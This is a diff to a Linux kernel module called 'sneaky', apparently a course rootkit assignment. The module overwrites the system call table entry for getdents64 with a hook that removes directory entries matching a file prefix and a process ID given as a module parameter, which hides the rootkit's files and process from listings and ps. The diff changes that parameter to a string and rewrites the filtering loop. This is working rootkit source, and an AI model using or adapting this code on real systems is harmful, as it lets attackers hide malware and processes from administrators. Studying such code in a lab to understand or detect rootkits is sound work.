@@ -29,8 +29,10 @@ struct linux_dirent64 {
            };
 
 // Command line argument for modules
-static int sneaky_pid;
-module_param(sneaky_pid, int, 0);
+MODULE_LICENSE("GPL");
+static char * sneaky_pid = "";
+module_param(sneaky_pid, charp, 0);
+MODULE_PARM_DESC(pid, "sneaky_pid");
 
 //This is a pointer to the system call table
 static unsigned long *sys_call_table;
@@ -100,29 +102,32 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs){
 // asmlinkage int sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 * dirp, unsigned int count){
   // Implement the sneaky part here
-
-  long nread;
-  // Implement the sneaky part here
+  struct linux_dirent64 *d;
+  int bpos, nread;
+  
   unsigned long dirp = regs->si;
   nread = original_getdents64(regs);
-  if (nread == -1)
-    //handle_error("getdents");
-    printk(KERN_INFO "Error in calling original getdents64\n");
-  if (nread == 0)
+
+  if(nread == -1){
+    printk(KERN_INFO "Error in calling original gendents64\n");
+  }
+  else if (nread == 0){
     return 0;
+  }
   else{
-    struct linux_dirent64 *d;
-    long bpos = 0;
-    for(; bpos < nread;){
-      d = (struct linux_dirent64 *) ((char*)dirp + bpos);
-      if(strcmp(d->d_name, PREFIX) == 0 || strcmp(d->d_name, "sneaky_pid") ==0){
+    for(bpos = 0; bpos < nread;){
+      d = (struct linux_dirent64 *)(dirp + bpos);
+      if ((strcmp(d->d_name, PREFIX) == 0) || (strcmp(d->d_name, sneaky_pid) == 0)) {
+      //if(memcmp(PREFIX, d->d_name, strlen(PREFIX)) == 0 ){
         memmove((char*) dirp + bpos, (char*) dirp + bpos + d->d_reclen, nread - (bpos + d->d_reclen));
-        nread -= d->d_reclen;  
+        nread -= d->d_reclen; 
       }
       else{
         bpos += d->d_reclen;
       }
-    }  
+    }
+  }
+
   return nread;
 }
 
@@ -167,8 +172,6 @@ static int initialize_sneaky_module(void)
   //sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
   sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
   //sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
-
-
   
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
